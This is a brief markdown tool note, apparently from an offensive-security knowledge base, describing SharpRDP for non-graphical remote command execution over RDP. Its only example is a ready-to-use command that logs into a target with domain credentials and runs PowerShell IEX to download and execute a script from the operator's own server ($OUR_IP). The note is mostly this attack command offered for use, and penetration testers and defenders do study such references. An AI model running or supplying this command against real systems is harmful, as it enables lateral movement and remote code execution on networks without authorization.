---
tags:
  - tool
---
# SharpRDP

[SharpRDP](https://github.com/0xthirteen/SharpRDP) is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients.

## Capabilities

```powershell
# Connect
.\SharpRDP.exe computername=$HOST command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://$OUR_IP/$SCRIPT')" username=$DOMAIN\$USER password=$PASS
```

**Note:** The execution of commands using `SharpRDP` is limited to 259 characters.
